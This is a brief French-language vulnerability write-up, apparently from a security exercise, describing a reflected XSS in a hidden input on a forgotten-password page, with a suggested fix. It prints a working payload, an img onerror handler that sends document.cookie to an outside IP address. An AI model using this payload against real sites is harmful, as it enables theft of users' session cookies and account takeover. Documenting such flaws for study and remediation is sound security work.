Security breach name 	: XSS (Cross-site scripting) non-persistant

Principle 				: Insérer du code html/js/php dans un input pour essayer d'accéder à des données sensibles ou modifier la perception du site aux autres utilisateurs.

Solve 					: Stringifier les valeurs envoyé par le user.

In case 				: Sur la page Mpt de passe oublié nous sommes en mesure d'insérer du code dans l'input caché.
							code 	: <img src="azerty.jpg" onerror="window.location='http://46.101.40.236:3000/get_cookie_xss.php?cookie='+document.cookie;" hidden>
